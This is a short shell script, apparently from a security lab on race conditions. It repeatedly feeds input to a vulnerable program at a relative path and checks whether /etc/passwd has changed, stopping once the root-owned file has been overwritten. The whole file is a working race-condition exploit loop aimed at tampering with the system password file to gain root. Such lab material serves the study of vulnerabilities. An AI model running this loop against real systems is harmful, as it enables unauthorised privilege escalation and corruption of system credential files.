#!/bin/sh
old=$(ls -l /etc/passwd)
new=$(ls -l /etc/passwd)
while [ "$old" = "$new" ]
do
        echo 'Input to overwrite root file' | ./../../questions/race/race 
        new=$(ls -l /etc/passwd)
done
echo "File changed"
